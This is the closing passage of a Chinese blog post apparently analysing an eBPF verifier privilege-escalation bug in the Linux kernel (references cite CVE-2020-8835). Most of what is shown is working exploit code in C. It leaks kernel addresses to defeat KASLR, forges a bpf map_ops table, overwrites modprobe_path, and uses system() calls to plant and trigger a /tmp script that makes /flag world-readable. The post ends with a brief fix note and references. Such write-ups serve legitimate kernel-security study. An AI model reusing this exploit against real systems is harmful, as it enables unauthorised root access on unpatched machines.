class="line">        BPF_ST_MEM(BPF_W,BPF_REG_9,<span class="number">0x18</span>,BPF_MAP_TYPE_STACK),</span><br><span class="line">        <span class="comment">// *(r9+0x18)=*(map_type)=BPF_MAP_TYPE_STACK</span></span><br><span class="line">        BPF_ST_MEM(BPF_W,BPF_REG_9,<span class="number">0x24</span>,<span class="number">-1</span>),</span><br><span class="line">        <span class="comment">// *(r9+0x24)=*(max_entry)=-1</span></span><br><span class="line">        BPF_ST_MEM(BPF_W,BPF_REG_9,<span class="number">0x2c</span>,<span class="number">0x0</span>), </span><br><span class="line">        <span class="comment">// *(r9+0x2c)=*(spin_lock_off)=0</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        BPF_ALU64_IMM(BPF_MOV,BPF_REG_0,<span class="number">0</span>),</span><br><span class="line">        BPF_EXIT_INSN(),</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    run_bpf_prog(test_prog,<span class="keyword">sizeof</span>(test_prog)/<span class="keyword">sizeof</span>(test_prog[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(control_buf,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">    bpf_map_lookup_elem(control_mapfd,<span class="number">0</span>,control_buf);</span><br><span class="line">    bpf_map_lookup_elem(exp_mapfd,<span class="number">0</span>,exp_buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] dump:%p\n&quot;</span>,control_buf64[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">uint64_t</span> kbase=control_buf64[<span class="number">2</span>]<span class="number">-0x106cb40</span>;</span><br><span class="line">    <span class="type">uint64_t</span> modprobe_path=kbase+<span class="number">0x16616a0</span>;</span><br><span class="line">    <span class="type">uint64_t</span> map_addr=control_buf64[<span class="number">3</span>]<span class="number">-0xc0</span>+<span class="number">0x110</span>;</span><br><span class="line">    <span class="type">uint64_t</span> kaslr=kbase<span class="number">-0xffffffff81000000</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] kbase:%p\n&quot;</span>,kbase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] modp:%p\n&quot;</span>,modprobe_path);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] map_addr:%p\n&quot;</span>,map_addr);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// overwrite  </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">     <span class="type">uint64_t</span> fake_map_ops[]=&#123;</span><br><span class="line">        kaslr+<span class="number">0xffffffff811fd5e0</span>,</span><br><span class="line">        kaslr+<span class="number">0xffffffff811fe5a0</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        kaslr+<span class="number">0xffffffff811fdd30</span>,</span><br><span class="line">        kaslr+<span class="number">0xffffffff811fd6d0</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        kaslr+<span class="number">0xffffffff811e5ae0</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        kaslr+<span class="number">0xffffffff811e58b0</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        kaslr+<span class="number">0xffffffff811fd790</span>,</span><br><span class="line">        kaslr+<span class="number">0xffffffff811fdbf0</span>,</span><br><span class="line">        kaslr+<span class="number">0xffffffff811fd710</span>,</span><br><span class="line">        kaslr+<span class="number">0xffffffff811fd6d0</span>,</span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">        kaslr+<span class="number">0xffffffff811fda60</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        kaslr+<span class="number">0xffffffff811fd870</span>,</span><br><span class="line">        kaslr+<span class="number">0xffffffff811fe3b0</span>,</span><br><span class="line">        <span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">        kaslr+<span class="number">0xffffffff811fd660</span>,</span><br><span class="line">        kaslr+<span class="number">0xffffffff811fd690</span>,</span><br><span class="line">        kaslr+<span class="number">0xffffffff811fd830</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(exp_buf,(<span class="type">void</span>*)fake_map_ops,<span class="keyword">sizeof</span>(fake_map_ops));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    bpf_map_update_elem(exp_mapfd,<span class="number">0</span>,exp_buf,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] test dump:%p\n&quot;</span>,exp_buf64[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    control_buf64[<span class="number">0</span>]=<span class="number">0x2</span>;</span><br><span class="line">    control_buf64[<span class="number">1</span>]=<span class="number">0x1</span>;</span><br><span class="line">    bpf_map_update_elem(control_mapfd,<span class="number">0</span>,control_buf,BPF_ANY);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(exp_buf64,<span class="string">&#x27;a&#x27;</span>,<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    bpf_map_lookup_elem(exp_mapfd,<span class="number">0</span>,exp_buf);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] test dump:%p\n&quot;</span>,exp_buf64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_bpf_prog(test_prog,<span class="keyword">sizeof</span>(test_prog)/<span class="keyword">sizeof</span>(test_prog[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">    exp_buf64[<span class="number">0</span>]=<span class="number">0x706d742f</span> <span class="number">-1</span>;</span><br><span class="line">    bpf_map_update_elem(exp_mapfd,<span class="number">0</span>,exp_buf,modprobe_path);</span><br><span class="line">    exp_buf64[<span class="number">0</span>] = <span class="number">0x6d68632f</span> <span class="number">-1</span>;</span><br><span class="line">    bpf_map_update_elem(exp_mapfd,<span class="number">0</span>,exp_buf,modprobe_path+<span class="number">4</span>);</span><br><span class="line">    exp_buf64[<span class="number">0</span>] = <span class="number">0x646f</span> <span class="number">-1</span>;</span><br><span class="line">    bpf_map_update_elem(exp_mapfd,<span class="number">0</span>,exp_buf,modprobe_path+<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//sleep(10);</span></span><br><span class="line">    system(<span class="string">&quot;echo &#x27;#!/bin/sh&#x27; &gt;&gt; /tmp/chmod&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo &#x27;chmod 777 /flag&#x27; &gt;&gt; /tmp/chmod&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/chmod&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/tmp/fake&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<p><img src="https://blogimg-1314041910.cos.ap-guangzhou.myqcloud.com/image-20221122230355242.png" alt="image-20221122230355242"></p>
<h2 id="修复："><a href="#修复：" class="headerlink" title="修复："></a>修复：</h2><p>更新的版本中，该函数直接被patch掉了，算是代码写错了(?)</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/bpf.2.html">https://man7.org/linux/man-pages/man2/bpf.2.html</a></p>
<p><a target="_blank" rel="noopener" href="https://new.qq.com/rain/a/20200425A0KSAK00">https://new.qq.com/rain/a/20200425A0KSAK00</a></p>
<p><a target="_blank" rel="noopener" href="https://a1ex.online/2021/05/01/CVE-2020-8835-eBPF%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">https://a1ex.online/2021/05/01/CVE-2020-8835-eBPF%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification">https://www.zerodayinitiative.com/blog/2020/4/8/cve-2020-8835-linux-kernel-privilege-escalation-via-improper-ebpf-program-verification</a></p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/203416#h3-4">https://www.anquanke.com/post/id/203416#h3-4</a></p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>7r1p13J</span>
                    </p>
                
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/kernel/"># kernel</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/11/24/slab/">slab源码阅读</a>
            
            
            <a class="next" rel="next" href="/2022/11/20/ebpf/">ebpf初探</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>© 7r1p13J | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>